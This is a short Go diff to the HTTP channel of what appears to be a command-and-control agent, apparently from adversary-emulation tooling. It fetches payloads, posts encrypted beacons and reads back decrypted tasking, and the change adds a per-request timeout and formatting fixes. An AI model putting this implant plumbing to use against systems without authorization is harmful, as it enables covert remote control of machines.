@@ -15,7 +15,7 @@ import (
 
 var UA *string
 
-type HTTP struct {}
+type HTTP struct{}
 
 func init() {
 	util.CommunicationChannels["http"] = HTTP{}
@@ -57,7 +57,7 @@ func checkValidHTTPTarget(address string) (bool, error) {
 }
 
 func setHTTPProxyConfiguration(agent *util.AgentConfig) {
-	var proxyUrlFunc func (*http.Request) (*url.URL, error)
+	var proxyUrlFunc func(*http.Request) (*url.URL, error)
 
 	if proxyUrl, err := url.Parse(agent.Proxy); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
 		proxyUrlFunc = http.ProxyURL(proxyUrl)
@@ -71,7 +71,7 @@ func setHTTPProxyConfiguration(agent *util.AgentConfig) {
 func requestHTTPPayload(address string) ([]byte, string, int, error) {
 	valid, err := checkValidHTTPTarget(address)
 	if valid {
-		body, _, code, netErr := request(address, "GET", []byte{})
+		body, _, code, netErr := request(address, "GET", []byte{}, 60)
 		if netErr != nil {
 			return nil, "", code, netErr
 		}
@@ -84,16 +84,16 @@ func requestHTTPPayload(address string) ([]byte, string, int, error) {
 
 func beaconPOST(address string, beacon util.Beacon) []byte {
 	data, _ := json.Marshal(beacon)
-	body, _, code, err := request(address, "POST", util.Encrypt(data))
+	body, _, code, err := request(address, "POST", util.Encrypt(data), 20)
 	if len(body) > 0 && code == 200 && err == nil {
 		return []byte(util.Decrypt(string(body)))
 	}
 	return body
 }
 
-func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
+func request(address string, method string, data []byte, timeout time.Duration) ([]byte, http.Header, int, error) {
 	client := &http.Client{
-		Timeout: time.Second * 20,
+		Timeout: time.Second * timeout,
 	}
 	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
 	if err != nil {
